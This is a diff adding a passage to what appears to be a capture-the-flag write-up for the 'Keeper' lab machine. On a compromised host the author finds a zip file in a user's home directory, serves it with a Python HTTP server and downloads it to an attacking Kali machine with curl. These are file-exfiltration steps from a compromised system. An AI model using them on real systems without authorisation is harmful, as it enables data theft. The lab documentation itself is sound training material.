@@ -145,3 +145,34 @@ You have mail.
 Last login: Sat Feb  8 14:11:10 2025 from 10.10.14.19
 lnorgaard@keeper:~$
 ```
+
+## Enumerating the user's environment
+
+### Discovering a .zip file
+
+After listing the home directory of `lnorgaard` I found a zip file:
+
+```bash
+lnorgaard@keeper:~$ ls
+RT30000.zip  user.txt
+```
+
+Since `RT30000.zip` is not a default file one finds in a home directory, I decided to download it to my machine for further analysis.
+
+### Downloading the .zip file
+I started a python http server on the remote machine:
+
+```bash
+lnorgaard@keeper:~$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+
+```
+
+and `curl`ed the file into my box:
+
+```bash
+(sz3kz@kali)~{tun0:10.10.14.19}~[Keeper]$ curl http://${IP}:1234/RT30000.zip --output files.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 83.3M  100 83.3M    0     0   292k      0  0:04:52  0:04:52 --:--:--  269k
+```
